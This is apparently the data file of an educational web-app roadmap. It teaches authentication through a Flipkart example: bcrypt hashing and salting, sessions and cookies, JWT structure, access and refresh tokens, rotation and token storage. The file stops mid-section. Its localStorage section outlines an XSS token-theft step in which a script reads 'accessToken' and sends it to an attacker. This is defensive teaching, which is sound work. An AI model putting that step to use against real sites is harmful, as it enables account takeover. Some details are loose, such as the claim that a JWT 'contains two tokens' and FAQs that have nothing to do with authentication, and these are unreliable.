import checkout from "../assets/images/Checkout image.png"
import login from "../assets/images/Login.png"
import hacker from "../assets/images/hacker.jpeg"
import salt from "../assets/images/salt.png"
import hashing from "../assets/images/Hashing.png"
import rehash from "../assets/images/rehash.jpeg"
import JWT from "../assets/images/jwt.png"
import access from "../assets/images/access.png"
import rotation from "../assets/images/rotation.png"
export const roadmapData = [
  {
    id: "auth-flipkart",
    title: "How authentication works in Flipkart",
    nodes: [
      {
        id: 1,
        title: "Authentication",

    topics: [
      "What is Authentication",
      "Password hashing (bcrypt, salting)"
    ],
    topicDetails: {
      "What is Authentication": [
        { type: "paragraph", text: "You add an iPhone to cart on Flipkart → Click Buy Now → suddenly login required" },
        { type: "image", src: checkout, alt: "Flipkart checkout page asking user to login before buying" },
        {
          type: "curious-callout",
          text: "❓ Why exactly at checkout? Why not before?"
        },
        {
          type: "heading",
          text: "The problem that led to Authentication"
        },
        {
          type: "error-callout",
          title: "Imagine Flipkart had no login system — then:",
          list: [
            "Anyone could open your account",
            "Anyone could see your orders, address, bank details",
            "Anyone could place or cancel your orders",
            "There would be no way to know who is who"
          ],
          footer: "Basically — no privacy, no security, total chaos!"
        },
        {
          type: "heading",
          text: "What is Authentication ?"
        },
        {
          type: "paragraph",
          text: "Authentication is the process of verifying who a user is — basically checking \"Are you really who you claim to be?\" before allowing access to your app.",
        },

        {
          type: "heading",
          text: "How Authentication Works in Flipkart Login System ?"
        },
        {
          type: "step",
          title: "Step 1 — You Open Flipkart & Enter Credentials",
          desc: "You type your email and password on the login page and hit Login."
        },
        {
          type: "step",
          title: "Step 2 — Frontend Sends Data to Backend",
          desc: "Your email + password goes to Flipkart's Node.js server as a request."
        },
        {
          type: "code",
          code: "POST /login\n{\n  email: \"ram@gmail.com\",\n  password: \"ram123\"\n}"
        },
        {
          type: "step",
          title: "Step 3 — Server Checks the Database",
          desc: "Flipkart's server goes to the database and searches —\n\n\"Is there any user with this email?\""
        },
        {
          type: "code",
          code: "const user = await User.findOne({ email: \"ram@gmail.com\" });"
        },
        {
          type: "step",
          title: "Step 4 — Password is Verified",
          desc: "If user is found, it checks if the password matches.\n\nif (user.password === \"ram123\") ✅ // Match found"
        },
        {
          type: "step",
          title: "Step 5 — Server responds",
          desc: "✅ Password Matches → Login Success! You enter your account.\n❌ Password Wrong → Access Denied! \"Invalid credentials\" error."
        },
        { type: "image", src: login, alt: "Flipkart login page" },
        {
          type: "warning-callout",
          text: "⚠️ But Wait… We just said Flipkart checks password from database. Do you really think Flipkart stores your password like this?"
        },
        {
          type: "code",
          code: "password: mypassword123"
        },
        { type: "paragraph", text: "Lets see how Flipkart actually stores passwords and verifies them securely without risking user data." },

      ],
      "Password hashing (bcrypt, salting)": [

        {
          type: "paragraph",
          text: "You just saw Flipkart verifying your password. But think again… do you really believe Flipkart stores your password as plain text?"
        },

        {
          type: "curious-callout",
          text: "❓ If Flipkart stored your password as 'ram123', what happens if their database gets leaked?"
        },

        {
          type: "error-callout",
          title: "If passwords were stored in plain text:",
          list: [
            "Hackers instantly see every user's password",
            "One database leak = millions of accounts compromised",
            "Users who reuse passwords → their Gmail, bank, everything is gone",
            "Even company employees could read your password"
          ],
          footer: "👉 This is why plain text passwords are NEVER stored. Ever."
        },
        { type: "image", src: hacker, alt: "Hacker stealing data from database" },

        {
          type: "heading",
          text: "So What Does Flipkart Actually Store?"
        },

        {
          type: "paragraph",
          text: "Instead of saving your real password, Flipkart runs it through a hashing algorithm — which converts it into a random-looking string. This process is one-way. You can go password → hash, but never hash → password."
        },

        {
          type: "code",
          code: "ram123  →  $2b$10$KIRs7Mn5iBv3aG7Pxv8Oi.abc123XYZ..."
        },

        // ── WHAT IS BCRYPT ───────────────────────────────────────────

        {
          type: "heading",
          text: "What is bcrypt?"
        },

        {
          type: "paragraph",
          text: "bcrypt is the hashing algorithm Flipkart uses for passwords. Unlike fast algorithms like MD5, bcrypt is intentionally slow (~100ms per hash) so hackers can't brute-force billions of guesses per second. It also auto-generates a unique random salt for every user and bakes it directly into the final hash — so you get salt + hash as one single string."
        },

        {
          type: "code",
          code: "// $2b$   → bcrypt version\n// $10$   → cost factor (how slow/secure)\n// KIRs7Mn5iBv3aG7Pxv8Oi.    → random SALT (22 chars, auto-generated)\n// abc123XYZdef456GHI789jkl  → actual HASH (31 chars)\n\n$2b$10$KIRs7Mn5iBv3aG7Pxv8Oi.abc123XYZdef456GHI789jklmnopqrs"
        },

        // ── WHAT IS SALTING ──────────────────────────────────────────

        {
          type: "heading",
          text: "What is Salting?"
        },

        {
          type: "paragraph",
          text: "A salt is a random string bcrypt generates fresh for every user during signup. It gets mixed into the password before hashing — so even if two users have the exact same password, their stored hashes are completely different."
        },

        {
          type: "code",
          code: "// User A → password: ram123, salt: KIRs7...\n// Result  → $2b$10$KIRs7...HASH_A\n\n// User B → password: ram123, salt: 9mXpQ...\n// Result  → $2b$10$9mXpQ...HASH_B\n\n// Same password. Completely different hashes. 🔒"
        },
        { type: "image", src: salt, alt: "Salt protects identical passwords from looking identical in the database" },


        {
          type: "error-callout",
          title: "Without salting — the problem:",
          list: [
            "Ram's password: Ram123 → hash: abc123...",
            "Priya's password: Ram123 → hash: abc123...",
            "Same password = exact same hash, every single time",
            "Hacker leaks the DB, sees both have 'abc123...' → cracks one → gets both instantly"
          ],
        },
        {
          type: "success-callout",
          text: "With salting — Ram's hash and Priya's hash look completely different, even though their password is identical. Cracking one tells you nothing about the other."

        },

        // ── SIGNUP ───────────────────────────────────────────────────

        {
          type: "heading",
          text: "What Happens When You Sign Up?"
        },

        {
          type: "step",
          title: "Step 1 — You enter your password",
          desc: "You type 'ram123' and click Sign Up."
        },

        {
          type: "step",
          title: "Step 2 — bcrypt generates a random salt",
          desc: "bcrypt creates a unique 22-character salt just for you. e.g. KIRs7Mn5iBv3aG7Pxv8Oi."
        },

        {
          type: "step",
          title: "Step 3 — password + salt → hashed together",
          desc: "bcrypt combines 'ram123' + salt and runs it through the hashing process."
        },

        {
          type: "code",
          code: "const hashedPassword = await bcrypt.hash('ram123', 10);\n// → '$2b$10$KIRs7Mn5iBv3aG7Pxv8Oi.abc123XYZ...'"
        },

        {
          type: "step",
          title: "Step 4 — Only the hash is stored in the database",
          desc: "The plain password 'ram123' is discarded immediately. Only the hash string is saved."
        },

        {
          type: "code",
          code: "// Stored in DB:\n{\n  email: 'ram@gmail.com',\n  password: '$2b$10$KIRs7Mn5iBv3aG7Pxv8Oi.abc123XYZ...'\n}"
        },
        { type: "image", src: hashing, alt: "hashing" },

        {
          type: "insight-callout",
          text: "💡 Even Flipkart's own engineers cannot reverse this hash back to 'ram123'. It's gone forever."
        },

        // ── LOGIN ────────────────────────────────────────────────────

        {
          type: "heading",
          text: "Now — Same User Comes Back to Login"
        },

        {
          type: "paragraph",
          text: "Ram created his account. Next day he opens Flipkart and types 'ram123' again to log in. But wait — Flipkart never saved 'ram123'. It only has a hash. So how does it verify him?"
        },

        {
          type: "step",
          title: "Step 1 — Ram enters his password",
          desc: "He types 'ram123' on the login page."
        },

        {
          type: "step",
          title: "Step 2 — Server fetches the stored hash from the database",
          desc: "Flipkart finds Ram's record and retrieves: '$2b$10$KIRs7Mn5iBv3aG7Pxv8Oi.abc123...'"
        },

        {
          type: "step",
          title: "Step 3 — bcrypt reads the salt out of the stored hash",
          desc: "The salt is already embedded inside the hash string (those 22 characters after $10$). bcrypt extracts it automatically — no separate salt column needed."
        },

        {
          type: "code",
          code: "// Stored: $2b$10$KIRs7Mn5iBv3aG7Pxv8Oi.abc123XYZ...\n//                  ↑ bcrypt pulls this salt back out\n//                  KIRs7Mn5iBv3aG7Pxv8Oi."
        },

        {
          type: "step",
          title: "Step 4 — Re-hash the login attempt using that same salt",
          desc: "bcrypt takes Ram's typed password + the extracted salt and runs the same hashing process again. If the result matches the stored hash → login success."
        },

        {
          type: "code",
          code: "const isMatch = await bcrypt.compare('ram123', user.password);\n// bcrypt internally:\n// 1. Extracts salt from stored hash\n// 2. Hashes 'ram123' + salt again\n// 3. Compares result to stored hash\n\nif (isMatch) {\n  // ✅ Hashes matched → login success\n} else {\n  // ❌ Wrong password\n}"
        },
        { type: "image", src: rehash, alt: "rehash" },

        {
          type: "insight-callout",
          text: "💡 bcrypt never decrypts anything. It just re-hashes the attempt with the same salt and checks if the output looks identical."
        },

        {
          type: "warning-callout",
          text: "⚠️ So passwords are now secured. But a new problem appears…"
        },

        {
          type: "curious-callout",
          text: "❓ Ram logs in once. Then he visits his orders, his cart, his profile — Flipkart never asks for his password again. How does it remember him across all these pages?"
        },

        {
          type: "paragraph",
          text: "👉 Authentication only checks your password once. But HTTP is stateless — every new request is a blank slate. So how does Flipkart keep track of who you are?"
        },



      ]

    },
    // faqs: [
    //   {
    //     question: "Is Frontend Development really coding?",
    //     answer: "Do frontend developers really code? The answer is yes, absolutely.\n\nThe fact that frontend developers are full-time developers who produce an output that is visually appealing (thanks to the designs provided by others) sometimes confuses others, making them believe that frontend developers aren’t really coding. However, that couldn’t be further from the truth.\n\nAs a frontend developer, you’ll be coding all the time.\n\nWhile in some companies, the frontend developer is also a skilled designer or UX engineer, those are not the typical profiles. As a frontend dev, your learning focus should be coding-related (i.e coding best practices, software design patterns, frontend architecture, etc)."
    //   },
    //   { question: "Is Frontend Developer a good career?", answer: "Yes, it is a highly demanded and rewarding career path." },
    //   { question: "How to prepare for a frontend developer interview?", answer: "Practice algorithms, build portfolio projects, and understand core web fundamentals like HTML, CSS, and JS." },
    //   { question: "How is Frontend Development different from Backend Development?", answer: "Frontend deals with the user interface and browser, while backend deals with servers, databases, and business logic." },
    //   { question: "What are the job titles of a Frontend Developer?", answer: "Frontend Engineer, UI Developer, Web Developer, UX Engineer, etc." },
    //   { question: "How to become a Frontend Developer?", answer: "Learn HTML, CSS, JavaScript, pick a framework like React or Vue, and build projects." }
    // ]
  },
  {
    id: 2,
    title: "Session-Based Auth",

    topics: [

      "Session-based auth (cookies + server session)",

    ],
    topicDetails: {
      "Session-based auth (cookies + server session)": [

        {
          type: "paragraph",
          text: "Ram just logged in successfully. Flipkart verified his password. But now Ram clicks on 'My Orders'… a completely new page loads. How does Flipkart still know it's Ram?"
        },

        {
          type: "curious-callout",
          text: "❓ HTTP has no memory. Every request is a stranger. So when Ram opens his orders page, the server sees a request — but has no idea who sent it."
        },

        {
          type: "error-callout",
          title: "Without sessions or cookies:",
          list: [
            "Ram logs in → server verifies password ✅",
            "Ram clicks 'My Orders' → server asks: who are you?",
            "Ram clicks 'My Cart' → server asks: who are you?",
            "Ram would have to enter his password on every single page 😩"
          ],
          footer: "👉 This is the problem sessions and cookies solve together."
        },

        // ── SESSIONS ─────────────────────────────────────────────────

        {
          type: "heading",
          text: "What is a Session?"
        },

        {
          type: "paragraph",
          text: "A session is a record stored on the server that keeps track of a user's login state. When Ram logs in, Flipkart creates a session for him — a unique entry in their database that says 'This is Ram, he's logged in, and here's his user info.'"
        },

        {
          type: "code",
          code: "// After Ram logs in, server creates a session:\nsessionStore['abc987xyz'] = {\n  userId: 42,\n  email: 'ram@gmail.com',\n  loggedInAt: '2024-01-15T21:00:00'\n};\n\n// 'abc987xyz' is the session ID — a random key"
        },

        {
          type: "insight-callout",
          text: "💡 The session itself lives on the SERVER. Ram never sees it. Ram only gets the session ID — like a token number at a bank."
        },

        // ── COOKIES ──────────────────────────────────────────────────

        {
          type: "heading",
          text: "What is a Cookie?"
        },

        {
          type: "paragraph",
          text: "A cookie is a small piece of data that the server asks the browser to store. When Ram logs in, Flipkart sends a cookie with the session ID back to his browser. The browser saves this cookie and automatically includes it in every future request to Flipkart."
        },

        {
          type: "code",
          code: "// Server sends this in the login response:\nSet-Cookie: sessionId=abc987xyz; HttpOnly; Secure\n\n// Browser saves it silently.\n// From now on, every request Ram makes includes:\nCookie: sessionId=abc987xyz"
        },

        {
          type: "insight-callout",
          text: "💡 Ram doesn't do anything. The browser handles cookies automatically — storing them, sending them. Ram just browses normally."
        },

        // ── HOW THEY WORK TOGETHER ───────────────────────────────────

        {
          type: "heading",
          text: "Now Ram Clicks 'My Orders'"
        },

        {
          type: "paragraph",
          text: "Ram clicks 'My Orders'. His browser automatically attaches the cookie to the request. The server reads the session ID from the cookie, looks it up in the session store, finds Ram's record — and knows exactly who he is. No password needed."
        },

        {
          type: "step",
          title: "Step 1 — Ram clicks any page",
          desc: "Browser automatically sends: Cookie: sessionId=abc987xyz with the request."
        },

        {
          type: "step",
          title: "Step 2 — Server reads the session ID from the cookie",
          desc: "It takes 'abc987xyz' and looks it up in the session store."
        },

        {
          type: "code",
          code: "const session = sessionStore['abc987xyz'];\n// → { userId: 42, email: 'ram@gmail.com' }\n\n// Server now knows it's Ram — without any password check"
        },

        {
          type: "step",
          title: "Step 3 — Server responds with Ram's data",
          desc: "Since it found Ram's session, it returns his orders, his cart, his profile — whatever he asked for."
        },

        {
          type: "success-callout",
          text: "Session = Ram's login record, stored on the SERVER. Cookie = the session ID, stored in the BROWSER. Cookie carries the ID → server uses it to find the session → knows who Ram is."
        },

        // ── SESSION EXPIRY ───────────────────────────────────────────

        {
          type: "heading",
          text: "What About 'Remember Me' and Logout?"
        },

        {
          type: "paragraph",
          text: "Sessions don't last forever. Flipkart can set an expiry — say, 7 days. After that, the session is deleted from the server. Ram's cookie still exists in his browser, but when he sends it, the server finds nothing → treats him as logged out → redirects to login page."
        },

        {
          type: "code",
          code: "// On logout — server simply deletes the session:\ndelete sessionStore['abc987xyz'];\n\n// Now even if Ram's browser sends the old cookie,\n// server finds nothing → 'Please login again'"
        },

        {
          type: "insight-callout",
          text: "💡 This is why logging out on one device doesn't always log you out on another — each device has its own cookie with its own session ID."
        },

        {
          type: "warning-callout",
          text: "⚠️ Sessions work great. But storing sessions on the server has a scaling problem…"
        },

        {
          type: "curious-callout",
          text: "❓ Flipkart has millions of users logged in at the same time. Storing all their sessions on one server's memory? That server would crash. So what do they do instead?"
        },

        {
          type: "paragraph",
          text: "👉 This is where JWT (JSON Web Tokens) come in — a way to handle login state without storing anything on the server at all."
        },
      ]
    },
    faqs: [
      {
        question: "Is Frontend Development really coding?",
        answer: "Do frontend developers really code? The answer is yes, absolutely.\n\nThe fact that frontend developers are full-time developers who produce an output that is visually appealing (thanks to the designs provided by others) sometimes confuses others, making them believe that frontend developers aren’t really coding. However, that couldn’t be further from the truth.\n\nAs a frontend developer, you’ll be coding all the time.\n\nWhile in some companies, the frontend developer is also a skilled designer or UX engineer, those are not the typical profiles. As a frontend dev, your learning focus should be coding-related (i.e coding best practices, software design patterns, frontend architecture, etc)."
      },
      { question: "Is Frontend Developer a good career?", answer: "Yes, it is a highly demanded and rewarding career path." },
      { question: "How to prepare for a frontend developer interview?", answer: "Practice algorithms, build portfolio projects, and understand core web fundamentals like HTML, CSS, and JS." },
      { question: "How is Frontend Development different from Backend Development?", answer: "Frontend deals with the user interface and browser, while backend deals with servers, databases, and business logic." },
      { question: "What are the job titles of a Frontend Developer?", answer: "Frontend Engineer, UI Developer, Web Developer, UX Engineer, etc." },
      { question: "How to become a Frontend Developer?", answer: "Learn HTML, CSS, JavaScript, pick a framework like React or Vue, and build projects." }
    ]
  },
  {
    id: 3,
    title: "Token-Based Auth",

    topics: [
      "JWT (structure: header, payload, signature)",
      "Access Token vs Refresh Token",
      "Token Rotation & Refresh Flow",
      "Storing tokens (localStorage vs httpOnly cookies)"
    ],
    topicDetails: {
      "JWT (structure: header, payload, signature)": [

        {
          type: "paragraph",
          text: "Ram is logged in on Flipkart. But Flipkart has 500 servers running at the same time. Ram's session was created on Server #1 — but his next request goes to Server #3. Server #3 has no idea who Ram is. Session-based auth breaks at scale."
        },

        {
          type: "curious-callout",
          text: "❓ What if instead of storing Ram's login info on the server — we just give Ram a token that already contains his info? Server doesn't need to remember anything."
        },

        {
          type: "insight-callout",
          text: "💡 This is exactly what JWT does. JWT = JSON Web Token. Instead of a session ID that points to server-stored data, a JWT is a self-contained token — Ram's identity is baked inside the token itself."
        },

        // ── WHAT A JWT LOOKS LIKE ────────────────────────────────────

        {
          type: "heading",
          text: "What Does a JWT Actually Look Like?"
        },

        {
          type: "paragraph",
          text: "A JWT is just a long string with exactly two dots in it — splitting it into three parts."
        },

        {
          type: "code",
          code: "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjQyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n//  ─────────────────  ──────────────────  ──────────────────────────────────────────\n//      HEADER              PAYLOAD                     SIGNATURE"
        },

        {
          type: "insight-callout",
          text: "💡 Each part is just Base64 encoded — meaning it's not encrypted, just encoded. Anyone can decode the header and payload and read them."
        },

        // ── HEADER ───────────────────────────────────────────────────

        {
          type: "heading",
          text: "Part 1 — Header"
        },

        {
          type: "paragraph",
          text: "The header just says what type of token this is and which algorithm was used to sign it. Nothing interesting — just metadata."
        },

        {
          type: "code",
          code: "{\n  'alg': 'HS256',   // signing algorithm used\n  'typ': 'JWT'       // type of token\n}"
        },

        // ── PAYLOAD ──────────────────────────────────────────────────

        {
          type: "heading",
          text: "Part 2 — Payload"
        },

        {
          type: "paragraph",
          text: "This is the actual data — Ram's identity baked right into the token. The server reads this to know who Ram is, without checking any database or session store."
        },

        {
          type: "code",
          code: "{\n  'userId': 42,\n  'email': 'ram@gmail.com',\n  'role': 'user',\n  'iat': 1716000000,   // issued at (when token was created)\n  'exp': 1716086400    // expires at (24 hours later)\n}"
        },

        {
          type: "error-callout",
          title: "Important — payload is NOT secret:",
          list: [
            "Anyone who has this token can decode and read the payload",
            "Never store sensitive info here — no passwords, no card numbers",
            "Only store things like userId, email, role — things that identify the user"
          ],
          footer: "👉 JWT is about VERIFYING identity, not hiding data."
        },

        // ── SIGNATURE ────────────────────────────────────────────────

        {
          type: "heading",
          text: "Part 3 — Signature (The Important One)"
        },

        {
          type: "paragraph",
          text: "This is what makes JWT secure. The server takes the header + payload, combines them, and signs it using a secret key that only the server knows. This produces the signature."
        },

        {
          type: "code",
          code: "signature = HMAC_SHA256(\n  base64(header) + '.' + base64(payload),\n  'flipkart_secret_key_nobody_knows'\n)"
        },

        {
          type: "paragraph",
          text: "Now here's why this matters. What if Ram opens his token, changes his userId from 42 to 1 (trying to access someone else's account), and sends it? The server re-computes the signature from the new payload — it won't match the original signature. Tampered. Rejected."
        },

        {
          type: "success-callout",
          text: "The signature doesn't hide the data — it LOCKS it. Any change to the payload breaks the signature. The server catches it instantly."
        },

        // ── HOW IT WORKS END TO END ──────────────────────────────────

        {
          type: "heading",
          text: "So How Does Ram Use His JWT?"
        },

        {
          type: "step",
          title: "Step 1 — Ram logs in",
          desc: "Server verifies his password. Creates a JWT with his userId and expiry baked in. Signs it. Sends it to Ram."
        },

        {
          type: "code",
          code: "const token = jwt.sign(\n  { userId: 42, email: 'ram@gmail.com' },\n  'flipkart_secret_key',\n  { expiresIn: '24h' }\n);"
        },

        {
          type: "step",
          title: "Step 2 — Ram stores the token",
          desc: "Browser saves the JWT (in localStorage or a cookie). Ram doesn't see or touch it."
        },

        {
          type: "step",
          title: "Step 3 — Ram clicks 'My Orders'",
          desc: "Browser sends the JWT in every request inside the Authorization header."
        },

        {
          type: "code",
          code: "// Every request Ram makes:\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjQyfQ.SflKx..."
        },

        {
          type: "step",
          title: "Step 4 — Server verifies the token",
          desc: "Server checks the signature using its secret key. If valid → reads userId from payload → serves Ram's orders. No database lookup. No session store. Nothing."
        },

        {
          type: "code",
          code: "const decoded = jwt.verify(token, 'flipkart_secret_key');\n// → { userId: 42, email: 'ram@gmail.com', exp: 1716086400 }\n\n// Server knows it's Ram. Done."
        },
        { type: "image", src: JWT, alt: "JWT structure" },

        {
          type: "insight-callout",
          text: "💡 Any of Flipkart's 500 servers can verify this token independently — they all know the secret key. No shared session store needed. This is why JWT scales."
        },

        {
          type: "warning-callout",
          text: "⚠️ But wait — a JWT contains two different tokens. One short-lived, one long-lived. Why two? What's the difference?"
        },

        {
          type: "curious-callout",
          text: "❓ If Ram's JWT expires in 24 hours, does he have to log in again every single day? That sounds annoying. How does Flipkart keep him logged in silently?"
        },



      ],
      "Access Token vs Refresh Token": [

        {
          type: "paragraph",
          text: "Ram just received his JWT after logging in. But Flipkart actually sends him two tokens — not one. An Access Token and a Refresh Token. Most developers get confused here. Let's fix that."
        },

        {
          type: "curious-callout",
          text: "❓ Why would you need two tokens? Why not just one JWT that lasts forever?"
        },

        {
          type: "error-callout",
          title: "If the JWT lasted forever — the problem:",
          list: [
            "Ram uses Flipkart on a public computer and forgets to logout",
            "Someone steals Ram's token from that computer",
            "That person now has Ram's token — valid forever",
            "They can access Ram's account, place orders, everything — and Flipkart can't stop them"
          ],
          footer: "👉 A stolen token that never expires = permanent access to someone's account."
        },

        {
          type: "insight-callout",
          text: "💡 So Flipkart makes the main token expire very quickly — in 15 minutes. Even if someone steals it, it's useless in 15 minutes. But then… does Ram have to log in every 15 minutes? No. That's where the Refresh Token comes in."
        },

        // ── ACCESS TOKEN ─────────────────────────────────────────────

        {
          type: "heading",
          text: "What is an Access Token?"
        },

        {
          type: "paragraph",
          text: "The Access Token is the token Ram sends with every request — to his orders page, cart, profile, everything. It's short-lived on purpose. If stolen, it stops working in 15 minutes."
        },

        {
          type: "code",
          code: "// Access Token — short-lived\nconst accessToken = jwt.sign(\n  { userId: 42, email: 'ram@gmail.com' },\n  'access_secret',\n  { expiresIn: '15m' }  // expires in 15 minutes\n);"
        },

        {
          type: "insight-callout",
          text: "💡 Access Token = your daily entry pass. Works fast, used constantly, but expires quickly."
        },

        // ── REFRESH TOKEN ────────────────────────────────────────────

        {
          type: "heading",
          text: "What is a Refresh Token?"
        },

        {
          type: "paragraph",
          text: "The Refresh Token is a second token Flipkart gives Ram at login. It lives much longer — 7 to 30 days. Ram never sends this with normal requests. Its only job is one thing: when the Access Token expires, use the Refresh Token to silently get a fresh Access Token — without asking Ram to log in again."
        },

        {
          type: "code",
          code: "// Refresh Token — long-lived\nconst refreshToken = jwt.sign(\n  { userId: 42 },\n  'refresh_secret',\n  { expiresIn: '7d' }  // expires in 7 days\n);"
        },

        {
          type: "insight-callout",
          text: "💡 Refresh Token = your passport. Stored safely, rarely used, but lets you get a new entry pass when the old one expires."
        },

        // ── SIDE BY SIDE ─────────────────────────────────────────────

        {
          type: "heading",
          text: "Access Token vs Refresh Token — Side by Side"
        },

        {
          type: "table",
          headers: ["", "Access Token", "Refresh Token"],
          rows: [
            ["Lifespan", "15 min – 1 hour", "7 – 30 days"],
            ["Used for", "Every API request", "Only to get a new Access Token"],
            ["Sent where", "Authorization header", "Stored safely, sent to /refresh route only"],
            ["If stolen", "Useless in 15 min", "Big problem — can generate new Access Tokens"],
          ]
        },

        // ── THE FLOW ─────────────────────────────────────────────────

        {
          type: "heading",
          text: "Ram's Session — How It Actually Plays Out"
        },

        {
          type: "step",
          title: "Step 1 — Ram logs in",
          desc: "Server verifies password. Issues both tokens. Ram's browser stores them."
        },

        {
          type: "code",
          code: "// Server sends both on login:\n{\n  accessToken: 'eyJ...',   // valid 15 min\n  refreshToken: 'eyJ...'  // valid 7 days\n}"
        },

        {
          type: "step",
          title: "Step 2 — Ram browses normally",
          desc: "Every request uses the Access Token. Works fine for 15 minutes."
        },

        {
          type: "step",
          title: "Step 3 — Access Token expires",
          desc: "Ram clicks 'My Orders'. Server responds: 401 Unauthorized — token expired."
        },

        {
          type: "step",
          title: "Step 4 — Browser silently sends the Refresh Token",
          desc: "Ram sees nothing. Browser sends the Refresh Token to /auth/refresh → server verifies it → generates a brand new Access Token → sends it back."
        },


        {
          type: "code",
          code: "// Browser automatically hits:\nPOST /auth/refresh\n{ refreshToken: 'eyJ...' }\n\n// Server verifies it, issues a brand new Access Token:\n{ accessToken: 'eyJ...NEW...' }  // fresh 15 min window"
        },

        {
          type: "step",
          title: "Step 5 — Ram continues browsing",
          desc: "New Access Token is now in use. Ram never saw a login screen. It all happened silently in under a second."
        },
        { type: "image", src: access, alt: "Access Token vs Refresh Token flow" },

        {
          type: "success-callout",
          text: "This is why you stay logged in on Flipkart for days without re-entering your password — the Refresh Token keeps silently renewing your Access Token in the background."
        },

        // ── WHAT IF REFRESH TOKEN IS STOLEN ──────────────────────────

        {
          type: "heading",
          text: "What if the Refresh Token Gets Stolen?"
        },

        {
          type: "paragraph",
          text: "This is the serious one. Unlike an Access Token that expires in 15 minutes, a stolen Refresh Token lets someone keep generating new Access Tokens for 7 days. This is why Flipkart stores Refresh Tokens in the database and can invalidate them."
        },

        {
          type: "code",
          code: "// On logout — server deletes the Refresh Token from DB:\nawait RefreshToken.delete({ userId: 42 });\n\n// Now even if someone has the stolen Refresh Token,\n// server checks DB → not found → rejected ❌"
        },

        {
          type: "insight-callout",
          text: "💡 Access Tokens are stateless — server can't revoke them early. Refresh Tokens are stored in DB — server can kill them anytime. This is why the two-token system exists."
        },
        {
          type: "warning-callout",
          text: "⚠️ Access Token is short-lived — stolen one expires in 15 min. But Refresh Token lasts 7 days. If someone steals that, they can keep generating fresh Access Tokens and stay in Ram's account for days."
        },

        {
          type: "curious-callout",
          text: "❓ So how does Flipkart make sure even a stolen Refresh Token becomes useless the moment Ram uses his?"
        },






      ],
      "Token Rotation & Refresh Flow": [

        {
          type: "paragraph",
          text: "Ram's Refresh Token was stolen. The attacker has it. Ram has it too. Both are about to use it. What happens?"
        },

        {
          type: "curious-callout",
          text: "❓ Without any protection — attacker uses the stolen Refresh Token → gets a fresh Access Token → stays in Ram's account for 7 days. Ram has no idea."
        },

        // ── WHAT IS TOKEN ROTATION ───────────────────────────────────

        {
          type: "heading",
          text: "What is Token Rotation?"
        },

        {
          type: "paragraph",
          text: "Token Rotation means every Refresh Token is single-use. The moment Ram uses his Refresh Token to get a new Access Token — server kills the old Refresh Token and issues a brand new one. So each Refresh Token works exactly once."
        },

        {
          type: "code",
          code: "// Ram sends Refresh Token to /auth/refresh:\n// 1. Server verifies it ✅\n// 2. Deletes old Refresh Token from DB 🗑️\n// 3. Issues new Access Token + new Refresh Token\n\nres.json({\n  accessToken: 'eyJ...NEW_ACCESS...',\n  refreshToken: 'eyJ...NEW_REFRESH...'  // completely new\n});"
        },

        {
          type: "insight-callout",
          text: "💡 Every refresh cycle, Ram gets a fresh pair. The old Refresh Token is dead the moment it's used."
        },

        // ── HOW THEFT IS DETECTED ────────────────────────────────────

        {
          type: "heading",
          text: "How Theft Gets Detected"
        },

        {
          type: "paragraph",
          text: "Here's the clever part. Say Ram uses his Refresh Token at 9:00 PM — server rotates it, old one is deleted. Attacker tries to use the same stolen token at 9:05 PM — server checks DB, that token is already gone. Server knows something is wrong."
        },

        {
          type: "code",
          code: "// Attacker sends the old stolen Refresh Token:\nPOST /auth/refresh\n{ refreshToken: 'eyJ...OLD_STOLEN...' }\n\n// Server checks DB → already deleted → ❌ Rejected\n// Server flags: possible token theft detected\n// Logs out Ram from ALL devices immediately"
        },

        {
          type: "error-callout",
          title: "When server detects a used token being reused:",
          list: [
            "Someone used an already-rotated token — clear sign of theft",
            "Server immediately invalidates ALL of Ram's Refresh Tokens",
            "Ram gets logged out everywhere — all devices",
            "Ram logs back in → gets a completely fresh token pair"
          ],
          footer: "👉 Attacker is kicked out. Ram logs back in. Damage window was minutes, not days."
        },

        // ── THE FULL REFRESH FLOW ────────────────────────────────────

        {
          type: "heading",
          text: "The Full Refresh Flow With Rotation"
        },

        {
          type: "step",
          title: "Step 1 — Ram's Access Token expires",
          desc: "Server returns 401 Unauthorized. Frontend intercepts this response before Ram ever sees it — no error shown, no page break, nothing."
        },

        {
          type: "step",
          title: "Step 2 — Frontend sends current Refresh Token to /auth/refresh",
          desc: "Ram sees nothing. In the background, browser quietly hits the /auth/refresh route with the current Refresh Token — asking the server for a new Access Token."
        },

        {
          type: "step",
          title: "Step 3 — Server verifies, rotates, responds",
          desc: "Server checks the Refresh Token against the DB. If valid — deletes the old Refresh Token immediately and issues a brand new Access Token + a brand new Refresh Token."
        },

        {
          type: "step",
          title: "Step 4 — Frontend stores the new tokens, retries the request",
          desc: "Old tokens are replaced with the fresh ones. Ram's original request — the one that failed with 401 — is automatically retried with the new Access Token. Ram just sees his page load normally."
        },
        { type: "image", src: rotation, alt: "rotation flow" },
        {
          type: "success-callout",
          text: "Every refresh cycle produces a new Refresh Token. The old one is dead. A stolen token becomes useless the moment the real user refreshes first."
        },

        {
          type: "warning-callout",
          text: "⚠️ Token Rotation protects against stolen Refresh Tokens. But how does the token get stolen in the first place? It comes down to where the browser stores it."
        },

        {
          type: "curious-callout",
          text: "❓ If Ram's token is sitting in localStorage, can a malicious script on the page just read it directly?"
        },



      ],
      "Storing tokens (localStorage vs httpOnly cookies)": [

        {
          type: "paragraph",
          text: "Ram's tokens are working perfectly. But they have to be stored somewhere in the browser. Where? This one decision decides whether Ram's token is safe — or can be stolen by a single malicious script."
        },

        {
          type: "curious-callout",
          text: "❓ Two options: localStorage or an httpOnly cookie. What's the difference and why does it matter?"
        },

        // ── LOCALSTORAGE ─────────────────────────────────────────────

        {
          type: "heading",
          text: "Option 1 — localStorage"
        },

        {
          type: "paragraph",
          text: "localStorage is a simple key-value store in the browser. Any JavaScript running on the page can read it — including malicious scripts."
        },

        {
          type: "code",
          code: "// Saving token in localStorage:\nlocalStorage.setItem('accessToken', 'eyJ...');\n\n// Reading it back:\nconst token = localStorage.getItem('accessToken');"
        },

        {
          type: "error-callout",
          title: "The problem — XSS attack:",
          list: [
            "A hacker injects a malicious script into Flipkart's page",
            "Script runs: localStorage.getItem('accessToken')",
            "Token is stolen — sent to the hacker's server",
            "Hacker now has Ram's token and full access to his account"
          ],
          footer: "👉 localStorage is accessible to ANY JavaScript on the page. That's the problem."
